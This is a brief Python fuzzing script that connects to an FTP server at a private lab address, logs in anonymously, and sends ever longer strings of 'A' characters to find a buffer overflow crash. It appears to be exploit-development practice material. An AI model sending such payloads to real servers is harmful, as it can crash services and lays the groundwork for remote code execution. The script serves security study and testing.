
from tkinter import E
from venv import create
import pwn
import signal, sys, socket

def def_handler(sig, frame):
    print("\n\n[!] Se tenso... \n")
    sys.exit(-1)

signal.signal(signal.SIGINT, def_handler)

def buffer():
    buffer = ['A']
    padding = 100
    while len(buffer)< 50:
        buffer.append("A"*padding)
        padding+=200

    for strings in buffer:   
        try:
            print("creating a new connection with socket")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except:
            print("Couldn't connec to direction")
            sys.exit(-1)
        try:
            print("Conecting to the target")
            s.connect(('192.168.26.5', 21))
            
        except:
            print("Couldn't connect to target")
            sys.exit(-1)
        try:
            print(f"sending {len(strings)} bytes")
            datos = "USER anonymous" + '\r\n'
            s.send(datos.encode())
            data = s.recv(1024)
            datos = "PASS TEST" + '\r\n'
            s.send(datos.encode())
            data = s.recv(1024)
            s.send(strings.encode())
            s.close()
        except:
            print("Couldn't send any information")
            sys.exit(-1)

        


if __name__ == '__main__':
    buffer() 